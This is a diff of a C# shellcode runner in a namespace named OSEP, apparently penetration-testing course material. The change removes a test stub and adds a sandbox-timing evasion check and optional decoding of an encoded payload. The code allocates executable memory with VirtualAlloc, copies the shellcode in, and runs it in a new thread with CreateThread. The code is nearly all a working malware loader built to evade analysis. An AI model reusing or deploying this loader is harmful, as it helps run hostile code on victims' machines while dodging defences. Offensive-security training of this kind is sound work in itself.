@@ -31,28 +31,26 @@ namespace OSEP
 
         public OSEPRunner()
         {
-            MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
-            System.IO.File.WriteAllText(".", "hello");
-            return;
+            
+
 
 
             if (CONFIG.DETECT_SANDBOX_TIME)
-                Evasion.SandboxTimeDetect();
-            
+                Evasion.SandboxTimeDetect(2000);
+
+
 
             int size = CONFIG.SHELLCODE.Length;
 
-
-            //Allocate memory for the shellcode
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
 
-            //Copy the shellcode from managed memory (the .NET byte[]) to unmanaged memory. GC can't touch this memory because it's unmanaged.
-            Marshal.Copy(CONFIG.SHELLCODE, 0, addr, size);
+            if (CONFIG.ENCODED == true)
+                Marshal.Copy(Evasion.Decode(CONFIG.SHELLCODE), 0, addr, size);
+            else
+                Marshal.Copy(CONFIG.SHELLCODE, 0, addr, size);
 
-            //Create a thread that points to the start of the shellcode. This will execute the shellcode in a new thread.
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 
-            //This forces the main thread to wait for the shellcode thread to finish.
             WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
